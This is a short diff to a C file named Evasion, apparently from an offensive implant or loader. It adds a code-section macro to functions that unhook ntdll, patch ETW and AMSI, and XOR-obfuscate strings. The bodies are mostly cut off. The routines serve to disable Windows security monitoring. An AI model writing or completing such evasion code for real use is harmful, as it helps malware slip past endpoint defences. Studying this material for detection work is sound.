@@ -1,6 +1,6 @@
 #include "../include/Evasion.h"
 
-VOID sdGetUnhookApi(UnhookApi* API, PVOID hNtdll) {
+D_SEC( B ) VOID sdGetUnhookApi(UnhookApi* API, PVOID hNtdll) {
 	API->NtProtectVirtualMemory = (NtProtectVirtualMemory_t)sdGetProcAddress(hNtdll, NT_VIRTUAL_PROTECT);
 	API->NtCreateFile = (NtCreateFile_t)sdGetProcAddress(hNtdll, NT_CREATE_FILE);
 	API->NtCreateSection = (NtCreateSection_t)sdGetProcAddress(hNtdll, NT_CREATE_SECTION);
@@ -9,7 +9,7 @@ VOID sdGetUnhookApi(UnhookApi* API, PVOID hNtdll) {
 	API->NtClose = (NtClose_t)sdGetProcAddress(hNtdll, NT_CLOSE);
 }
 
-BOOL sdUnhookDll(ULONG Hash, PVOID ModuleBase) {
+D_SEC( B ) BOOL sdUnhookDll(ULONG Hash, PVOID ModuleBase) {
 	// PE STUFF
 	PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)(ModuleBase);
 	PIMAGE_NT_HEADERS NtH = (PIMAGE_NT_HEADERS)((DWORD_PTR)ModuleBase + Dos->e_lfanew);
@@ -102,7 +102,7 @@ BOOL sdUnhookDll(ULONG Hash, PVOID ModuleBase) {
 	return TRUE;
 }
 
-BOOL sdPatchEtw(PVOID hNtdll) {
+D_SEC( B ) BOOL sdPatchEtw(PVOID hNtdll) {
 	NtProtectVirtualMemory_t NtProtectVirtualMemory = (NtProtectVirtualMemory_t)sdGetProcAddress(hNtdll, NT_VIRTUAL_PROTECT);
 	NTSTATUS status = 0;
 	DWORD dwOldProtect = 0;
@@ -126,7 +126,7 @@ BOOL sdPatchEtw(PVOID hNtdll) {
 	return TRUE;
 }
 
-VOID _Xor(PCHAR pBuffer, INT iLen, INT iKey, INT iCounter) {
+D_SEC( B ) VOID _Xor(PCHAR pBuffer, INT iLen, INT iKey, INT iCounter) {
 	if (iCounter < iLen) {
 		pBuffer[iCounter] ^= iKey;
 		iKey ^= iCounter;
@@ -134,11 +134,11 @@ VOID _Xor(PCHAR pBuffer, INT iLen, INT iKey, INT iCounter) {
 	}
 }
 
-VOID Xor(PCHAR pBuffer, INT iLen) {
+D_SEC( B ) VOID Xor(PCHAR pBuffer, INT iLen) {
 	_Xor(pBuffer, iLen, 0x40, 0);
 }
 
-BOOL sdPatchAmsi(PVOID hNtdll) {
+D_SEC( B ) BOOL sdPatchAmsi(PVOID hNtdll) {
 	LdrLoadDll_t LdrLoadDll = nullptr;
 	NtProtectVirtualMemory_t NtProtectVirtualMemory = nullptr;
 	NTSTATUS status = 0;
